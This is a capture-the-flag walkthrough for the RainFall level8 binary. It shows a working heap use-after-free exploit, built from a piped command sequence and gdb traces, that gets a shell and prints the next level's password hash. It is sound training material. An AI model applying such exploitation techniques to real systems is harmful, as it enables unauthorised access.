# Walkthrough

## Solution

```
(python -c "print ('auth '); print ('reset'); print('service0123456789012345'); print('login')"; cat) | ./level8
(nil), (nil) 
0x804a008, (nil) 
0x804a008, (nil) 
0x804a008, 0x804a018 
whoami
level9
cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Explanation

### Execution

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
hello
(nil), (nil) 
bonjour
(nil), (nil) 
^C
level8@RainFall:~$ ./level8 hello world
(nil), (nil) 
bon
(nil), (nil) 
^C
```
-> The programs prints "nil" twice and then waits for input in a loop.

### Disassembly

```
info var
0x08049aac  auth
0x08049ab0  service

info functions
0x08048540  frame_dummy
0x08048564  main
```
You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  


### Steps

```
(gdb) run
Starting program: /home/user/level8/level8 
(nil), (nil) 
> "auth " (ctrl+d and not enter, so that we don't have the \n in the input)
Breakpoint 1, 0x080486b5 in main ()
1: x/3i $pc
=> 0x80486b5 <main+337>:	lea    0x20(%esp),%eax
   0x80486b9 <main+341>:	mov    %eax,%edx
   0x80486bb <main+343>:	mov    $0x804882d,%eax
(gdb) c
Continuing.
0x804a008, (nil) 
> reset (ctrl+d and not enter, so that we don't have the \n in the input)
Breakpoint 1, 0x080486b5 in main ()
1: x/3i $pc
=> 0x80486b5 <main+337>:	lea    0x20(%esp),%eax
   0x80486b9 <main+341>:	mov    %eax,%edx
   0x80486bb <main+343>:	mov    $0x804882d,%eax
(gdb) c
Continuing.
0x804a008, (nil) 
serviceAAAAAAAAAAAAAAAAA (17 * 'A')
Breakpoint 1, 0x080486b5 in main ()
1: x/3i $pc
=> 0x80486b5 <main+337>:	lea    0x20(%esp),%eax
   0x80486b9 <main+341>:	mov    %eax,%edx
   0x80486bb <main+343>:	mov    $0x804882d,%eax
(gdb) c
Continuing.
0x804a008, 0x804a018 
login
Breakpoint 1, 0x080486b5 in main ()
1: x/3i $pc
=> 0x80486b5 <main+337>:	lea    0x20(%esp),%eax
   0x80486b9 <main+341>:	mov    %eax,%edx
   0x80486bb <main+343>:	mov    $0x804882d,%eax
(gdb) i var auth
All variables matching regular expression "auth":

Non-debugging symbols:
0x08049aac  auth
0xb7fd4314  _null_auth
0xb7fd4a90  svcauthdes_stats
(gdb) x/2wx 0x08049aac
0x8049aac <auth>:	0x0804a008	0x0804a018
(gdb) x/16wx 0x0804a008
0x804a008:	0x00000000	0x00000000	0x00000000	0x00000019
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x00000041	0x00020fd9	0x00000000	0x00000000       // 0x804a028 is not at 0 anymore, so we can launch the shell
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
$ pwd
/home/user/level8
```

- Final Command

(python -c "print ('auth '); print ('reset'); print('service0123456789012345'); print('login')"; cat) | ./level8